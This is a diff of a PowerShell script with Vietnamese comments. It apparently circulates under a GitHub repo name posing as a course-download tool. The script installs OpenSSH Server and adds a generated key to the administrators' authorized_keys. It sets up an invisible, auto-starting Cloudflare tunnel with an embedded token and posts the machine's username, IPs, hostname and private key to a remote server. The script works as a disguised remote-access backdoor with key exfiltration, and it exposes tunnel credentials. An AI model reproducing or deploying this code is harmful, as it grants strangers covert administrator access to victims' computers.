@@ -1,12 +1,15 @@
 <#
-  install_openssh.ps1 — BAN FULL (CHỈ CẦN TOKEN)
-  Cai OpenSSH -> sinh keypair -> cai cloudflared (chỉ cần Token) -> báo cáo
+  install_openssh.ps1 — BAN FINAL (CHỈ CẦN TOKEN)
+  Cai OpenSSH -> sinh keypair -> cai cloudflared -> báo cáo lên server
 #>
 
 # ==================== CAU HINH ====================
 $ApiBase = 'https://vm-ssh-manager.onrender.com'
 $SelfUrl = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main/drive_windows.ps1'
-$CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6IlltSmxaV1UyTW1RdE56Z3haQzAwWkdVMExXSTRNR1V0WVdJd01XVmtNemhtTXpsbSJ9"   # CHỈ CẦN CÁI NÀY
+
+# ⚠️ THAY ĐỔI 2 DÒNG DƯỚI ĐÂY TRƯỚC KHI CHẠY
+$CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6Ik1tRmtZV0l3TkRRdE16TTRZUzAwTVRReExUaG1OMkV0WTJVME5tRXdOekF3TnpVd01Ea3pPVGxrTW1VdE5tRmpaaTAwTVRZNUxXSTNOMk10WlRaak5UWmhZV1ZqWkdSaCJ9"   
+$YourDomain = "downloadspeed.tech" 
 # ==================================================
 
 $ErrorActionPreference = 'Stop'
@@ -34,7 +37,7 @@ if (-not $__admin) {
 }
 
 # ===== 1. CAI OPENSSH SERVER =====
-Write-Host '=== 1/3: Cai OpenSSH Server v2 ===' -ForegroundColor Cyan
+Write-Host '=== 1/4: Cai OpenSSH Server ===' -ForegroundColor Cyan
 $capName = 'OpenSSH.Server~~~~0.0.1.0'
 $cap = Get-WindowsCapability -Online -Name $capName -ErrorAction SilentlyContinue
 if (-not $cap -or $cap.State -ne 'Installed') {
@@ -60,7 +63,7 @@ for ($w = 0; $w -lt 30; $w++) {
 Write-Host ''; Write-Host ("  sshd: " + (Get-Service sshd).Status) -ForegroundColor Green
 
 # ===== 2. SINH KEYPAIR QUAN TRI + CAI PUBLIC =====
-Write-Host '=== 2/3: Sinh key quan tri ===' -ForegroundColor Cyan
+Write-Host '=== 2/4: Sinh key quan tri ===' -ForegroundColor Cyan
 $mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
 New-Item -ItemType Directory -Force -Path $mgmtDir | Out-Null
 $priv = Join-Path $mgmtDir 'mgmt_ed25519'
@@ -77,6 +80,7 @@ $privLine = (Get-Content $priv -Raw).Trim()
 $userKeyFile  = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
 $adminKeyFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
 foreach ($f in @($userKeyFile, $adminKeyFile)) {
+  # FIX: Tao thu muc .ssh neu chua co
   New-Item -ItemType Directory -Force -Path (Split-Path $f -Parent) | Out-Null
   $lines = @(); if (Test-Path $f) { $lines = @(Get-Content $f) }
   if ($lines -notcontains $pubLine) { Add-Content -Path $f -Value $pubLine -Encoding Ascii }
@@ -85,10 +89,9 @@ foreach ($f in @($userKeyFile, $adminKeyFile)) {
 Write-Host '  Da cai public key vao authorized_keys.' -ForegroundColor Green
 
 # ===== 3. CAI CLOUDFLARED (CHỈ CẦN TOKEN) =====
-# ===== 3. CAI CLOUDFLARED (CHỈ CAN TOKEN) =====
-Write-Host '=== 3/3: Cai Cloudflare Tunnel ===' -ForegroundColor Cyan
-if (-not $CFTunnelToken) {
-  Write-Host '[LOI] Thieu CF_TUNNEL_TOKEN. Dat bien moi truong roi chay lai.' -ForegroundColor Red
+Write-Host '=== 3/4: Cai Cloudflare Tunnel ===' -ForegroundColor Cyan
+if (-not $CFTunnelToken -or $CFTunnelToken -eq "DÁN_TOKEN_MỚI_VÀO_ĐÂY") {
+  Write-Host '[LOI] Thieu hoac chua thay doi CF_TUNNEL_TOKEN. Sua trong script roi chay lai.' -ForegroundColor Red
   exit 1
 }
 
@@ -108,7 +111,7 @@ if (-not (Test-Path $cfExe)) {
   Invoke-WebRequest $cfUrl -OutFile $cfExe -UseBasicParsing
 }
 
-# Don service cu bang sc.exe (khong bi loi stderr nhu cloudflared uninstall)
+# Don service cu bang sc.exe (tranh loi stderr cua cloudflared)
 $ErrorActionPreference = 'Continue'
 & sc.exe delete Cloudflared 2>&1 | Out-Null
 Start-Sleep -Seconds 2
@@ -130,18 +133,24 @@ Write-Host '  Service "Cloudflared" da chay (vo hinh, tu khoi dong).' -Foregroun
 
 # ===== 4. GUI LEN SERVER =====
 Write-Host '=== 4/4: Bao cao len server ===' -ForegroundColor Cyan
+
+# FIX: Lam sach ten may de hop le voi DNS (thay _ bang -, viet thuong)
+$safeName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9-]','-').ToLower()
+$cfHostname = "$safeName.$YourDomain"
+
 $validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
               Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
 $primaryIP = ($validIPs | Select-Object -First 1).IPAddress
 
 $payload = @{
-  vm_name     = $env:COMPUTERNAME
-  ip_address  = "$primaryIP"
-  port        = 22
-  username    = $env:USERNAME
-  public_key  = $pubLine
-  private_key = $privLine
-  all_ips     = @($validIPs | ForEach-Object { $_.IPAddress })
+  vm_name             = $env:COMPUTERNAME
+  ip_address          = "$primaryIP"
+  port                = 22
+  username            = $env:USERNAME
+  public_key          = $pubLine
+  private_key         = $privLine
+  cloudflare_hostname = $cfHostname
+  all_ips             = @($validIPs | ForEach-Object { $_.IPAddress })
 } | ConvertTo-Json -Compress
 
 if (-not $primaryIP) {
@@ -152,7 +161,7 @@ if (-not $primaryIP) {
     try {
       $body = [System.Text.Encoding]::UTF8.GetBytes($payload)
       $resp = Invoke-RestMethod -Uri $ReportUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing
-      Write-Host "[SUCCESS] $($resp.status) - VM $($resp.vm)" -ForegroundColor Green
+      Write-Host "[SUCCESS] $($resp.status) - VM $($resp.vm) | Hostname: $cfHostname" -ForegroundColor Green
       $sent = $true; break
     } catch {
       $detail = ''
@@ -169,4 +178,4 @@ if (-not $primaryIP) {
 }
 
 if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
-Write-Host "HOAN TAT. SSH vao may nay bang: ssh -i mgmt_ed25519 $env:USERNAME@$env:COMPUTERNAME.your-domain.com" -ForegroundColor Green
+Write-Host "HOAN TAT. SSH vao may nay bang: ssh $env:USERNAME@$cfHostname" -ForegroundColor Green
